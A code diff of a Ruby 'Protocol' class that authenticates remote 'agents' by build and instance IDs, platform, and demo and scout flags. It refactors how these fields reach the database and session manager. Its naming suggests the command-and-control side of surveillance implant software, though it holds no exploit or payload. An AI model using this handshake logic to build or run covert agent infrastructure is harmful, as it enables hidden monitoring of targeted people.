@@ -34,7 +34,7 @@ class Protocol
   end
 
   # Authentication phase
-  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
+  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, Platform, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
   def self.authenticate_elite(peer, uri, content)
     trace :info, "[#{peer}] Authentication required for (#{content.length.to_s} bytes)..."
@@ -89,9 +89,9 @@ class Protocol
     instance_id = message.slice!(0..19)
     trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').first
 
-    # subtype of the device
-    subtype = message.slice!(0..15)
-    trace :info, "[#{peer}] Auth -- subtype: " << subtype.delete("\x00")
+    # platform of the device
+    platform = message.slice!(0..15)
+    trace :info, "[#{peer}] Auth -- platform: " << platform.delete("\x00")
     
     # identification digest
     sha = message.slice!(0..19)
@@ -108,7 +108,7 @@ class Protocol
 
     # the server will calculate the same sha digest and authenticate the agent
     # since the conf key is pre-shared
-    sha_check = Digest::SHA1.digest(build_id + instance_id + subtype + conf_key)
+    sha_check = Digest::SHA1.digest(build_id + instance_id + platform + conf_key)
     trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s
 
     # identification failed
@@ -121,7 +121,10 @@ class Protocol
 
     # remove the trailing zeroes from the strings
     instance_id = instance_id.unpack('H*').first.downcase
-    subtype.delete!("\x00")
+    platform.delete!("\x00")
+    demo = platform.end_with? '-DEMO'
+    platform.gsub!(/-DEMO/, '')
+    scout = false
 
     # random key part chosen by the server
     ks = SecureRandom.random_bytes(16)
@@ -137,7 +140,7 @@ class Protocol
     message = aes_encrypt(ks, DB.instance.agent_signature)
 
     # ask the database the status of the agent
-    status, bid = DB.instance.agent_status(build_id_real, instance_id, subtype)
+    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the agent status
@@ -154,7 +157,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, subtype, k, peer)
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
@@ -246,12 +249,12 @@ class Protocol
     trace :info, "[#{peer}] Auth -- platform: " << platform
 
     demo = message.slice!(0).unpack('C')
+    demo = (demo.first == 1) ? true : false
     trace :debug, "[#{peer}] Auth -- demo: " << demo.to_s
-    platform += "-DEMO" if demo.first == 1
 
     scout = message.slice!(0).unpack('C')
+    scout = (scout.first == 1) ? true : false
     trace :debug, "[#{peer}] Auth -- scout: " << scout.to_s
-    platform += "-SCOUT" if scout.first == 1
 
     flags = message.slice!(0).unpack('C')
     trace :debug, "[#{peer}] Auth -- flags: " << flags.to_s
@@ -266,7 +269,7 @@ class Protocol
     trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s
 
     # ask the database the status of the agent
-    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform)
+    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the agent status
@@ -283,7 +286,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, k, peer)
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
